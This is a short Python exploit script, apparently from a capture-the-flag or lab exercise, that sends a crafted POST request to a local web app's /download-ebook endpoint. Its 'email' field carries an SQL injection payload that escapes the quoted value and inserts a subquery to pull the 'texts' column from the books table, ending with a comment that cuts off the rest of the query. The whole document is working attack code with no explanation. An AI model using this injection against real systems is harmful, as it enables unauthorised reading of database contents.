import requests

URL = "http://localhost:3000"

def send(payload):
    print(payload)
    r = requests.post(URL+"/download-ebook", data={
        "option": "kindle",
        "email": payload,
        "bookID": 1
    }, proxies={
        # "http":"http://localhost:8080"
    })
    print(r.text)

payload = "\"',(SELECT texts FROM books WHERE id = 1)); -- --@lol.com"
send(payload)
